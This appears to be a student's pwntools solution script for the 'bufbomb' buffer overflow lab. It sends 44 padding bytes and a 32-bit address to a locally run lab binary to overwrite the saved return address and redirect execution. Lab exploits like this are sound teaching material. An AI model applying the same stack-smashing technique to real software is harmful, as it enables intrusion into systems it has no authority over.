from pwn import *

io = process(["./bufbomb", "-u", "2212080197"])
payload = b"b"*44+p32(0x8048c18)
io.sendline(payload)
data = io.recv()
print(data.decode())
